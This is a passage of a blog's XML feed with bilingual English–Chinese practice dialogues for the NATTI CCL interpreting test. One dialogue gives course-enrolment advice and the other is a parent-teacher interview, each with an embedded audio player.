ownstudy habits, and your financial circumstances, of course. Are youworking at the moment?</td><td>这样，让我看看能帮上什么。我想，每一种类型的课程都有其利弊，所以主要还是根据自己的情况：你个人的学习习惯，当然，还有你的经济状况。你现在有工作吗?</td></tr><tr class="even"><td>M3</td><td>是的。我已经在某家当地的招待所做了三年的管理工作了。在那之前，我在一家销售公司做过两年的办公室工作。所以，我已经有5 年的相关工作经验了。这次我希望我能集中学习一下人事管理。</td><td>Yes. I have been working in the administration section of a localhostel for the last three years. And before that, I had worked in theoffice of a sales company for two years. So I have got about five yearsof relevant work experience. And this time I’m hoping to focus onpersonnel management.</td></tr><tr class="odd"><td>E4</td><td>I see. And are you planning to leave your current job to study, orare you thinking about just taking a few days off from your weeklyschedule?</td><td>我明白了。那你是打算辞掉你现在的工作呢，还是考虑每周请几天假而已?</td></tr><tr class="even"><td>M4</td><td>真的，我想知道我都有哪些选择。我不想辞职或者怎样，而且我的雇主非常希望那我能拿到更高的学历。但是很明显，如果我能够在不过多影响工作的前提下学习课程，那就更好了。</td><td>I want to know what my options are, really. I don’t want to quit myjob or anything and my employer is keen for me to get a higherqualification, but obviously it would be better if I could do a coursewithout taking too much time away from work. </td></tr><tr class="odd"><td>E5</td><td>In this case, the full-time course is definitely not suitable foryou, right? So how about the financial side of things? Will you pay forthe study by yourself? Or will it be your employer? </td><td>这样看来，全日制的课程是不大适合你了，对吗？那么钱的问题呢？你是自己付学费，还是你的雇主会帮你付？</td></tr><tr class="even"><td>M5</td><td>你看，我老板已经同意了为我支付课程本身的花费。但是，如果我想全日制学习的话，我必须请无薪假期，那么，我觉得我没办法在一整年都没有薪水的情况下养活自己。</td><td>You see, my boss has agreed to pay the cost of the course itself,but I would have to take unpaid leave if I want to study full-time and,well, I don’t think I could afford to support myself with no salary fora whole year. </td></tr><tr class="odd"><td>E6</td><td>Ok, well. You have two other possibilities: you could either do thepart-time course; that would be over two years and you won’t have totake much time off work. Or you could do what we call a modular course.You could do that in eighteen months or longer if you wanted.</td><td>好的，那么，你还有两个选择。第一个选择，你可以读业余课程，要两年才能修完。你将不要请很多假。或者第二个选择，你可以选修我们的模块课程。如果你想的话，可以18 个月修完，或者更长的时间也可 以。这个很灵活，都取决于你。</td></tr><tr class="even"><td>M6</td><td>后面这种听起来时间上比较灵活。我觉得会比较适合我的情况。我能知道更多的详细情况吗？</td><td>The latter one sounds more flexible in terms of the time. I think itwould suit me better. Could you give me some more details?</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>考前家访</title>
    <link href="https://yumtaro.com/archives/e7a7e161.html/"/>
    <id>https://yumtaro.com/archives/e7a7e161.html/</id>
    <published>2020-08-02T06:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-SbrJgJbP" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-SbrJgJbP"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL考前家访",              author: "SIIT",              url: "/assets/ccl/CCL考前家访.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This dialogue is between Mrs Huang (H), a mother, and Mr Edward (E),a school teacher. * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td>Good afternoon, Mrs Huang. I am Mr Edward, a high school mathsteacher. Your son Eden is in one of my maths classes. Thanks for comingto today’s parent and teacher interview.</td><td>下午好，黄太太。您可以称呼我 Edward先生。我是一名高中数学老师。您的儿子Eden，是我一个班上的学生。谢谢您来参加今天的家长 老师见面会。</td></tr><tr class="even"><td>M1</td><td>下午好，Edward 先生。我很高兴来这儿。但是，是因为什么事情呢？是 Eden在学校闯祸了吗？</td><td>Good afternoon, Mr Edward. I am happy to be here. But what is thisabout? Did Eden get into any trouble at school?</td></tr><tr class="odd"><td>E2</td><td>No, not at all. He is doing well. This kind of interview is arrangedfor every student in year 11. Because they are going to have their HSCexams next year, and they will have to make the first really importantdecision of their life on their own.</td><td>不，根本没有。他表现很好。这样的见面会是为每一名 11年级的学生安排的。因为他们明年就要参加高考了，而且他们将要首次自主做出人生中最重要的一个决定。</td></tr><tr class="even"><td>M2</td><td>是的，是的，我能理解。Eden也感觉到了压力很大。所以他学习更加刻苦了。作为家长，我和他爸爸都很关心他，可是又帮不上什么忙。</td><td>Yes, yes. I can understand that. Eden also feels a lot of pressure,so he is studying even harder now. As parents, his father and I careabout him very much. But there is not much that we can do to helphim. </td></tr><tr class="odd"><td>E3</td><td>That is exactly what we should figure out during today’s interview.Has Eden told you what he plans to do after graduating from highschool?</td><td>这正是我们今天会面要解决的问题。Eden有跟你讲过他高中毕业后的打算吗？</td></tr><tr class="even"><td>M3</td><td>他想读大学，学会计。按照这个目标，他现在的成绩够好吗？还是他需要再加多做做功课？您怎么认为？</td><td>Eden wants to go to the university and study accounting. Are hisgrades good enough for that or should he be doing more homework? What doyou think?</td></tr><tr class="odd"><td>E4</td><td>Well, I have to answer that in two parts. Firstly, Eden is receivingexcellent results in all tests and assignments. He is actually one ofthe best students in his class. You should feel very proud of him.</td><td>是这样，我必须分两个部分来回答这个问题。首先，Eden目前左右的测试和作业的成绩都非常好。他其实是他班上成绩最好的学生之一。您应该为他骄傲。</td></tr><tr class="even"><td>M4</td><td>这个消息太好了。我很高兴听到这样的消息。谢谢，我想他能取得这样的成绩，也多亏了您教导有方，辛勤耕耘。</td><td>That’s very good news. I am so glad to hear that. Thank you. Ibelieve it’s thanks to your excellent teaching and hard work that Edencould get such good grades. </td></tr><tr class="odd"><td>E5</td><td>Thank you I’m flattered. And as he is receiving such good results Idon’t think it is necessary for him to do more homework. And if he cancontinue to work hard in class, I don't think he will have a problem ingetting into an accounting course.</td><td>谢谢，您过奖了。既然他现在的成绩这么好，我觉得他没有必要再做更多的家庭作业了。而且，只要他能保持在课堂上努力的学习，我认为将来报读会计课程，对他来说没有问题。</td></tr><tr class="even"><td>M5</td><td>听您这样说，我和她爸就都可以放心了。我们都不想给 Eden太大的压力，是他自己，追求完美。</td><td>Hearing you say that, his father and I can now both relax. Neitherof us wants to put too much pressure on Eden. But it is just himself,always pursuing perfection. </td></tr><tr class="odd"><td>E6</td><td>Eden is such a smart yet humble boy. I can see there is somethingvery special about him and I can tell he will do everything he can tomake his dreams come true.</td><td>Eden 是这样一个聪明却谦虚的男孩子。我看到他身上有非常与众不同的地方。而且，我敢说，他会为了实现自己的梦想而不顾一切。</td></tr><tr class="even"><td>M6</td><td>谢谢您，Edward 先生。我们会一如既往的支持他的。</td><td>Thank you, Mr Edward. We will continue to support him as we alwayshave. </td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
</feed>
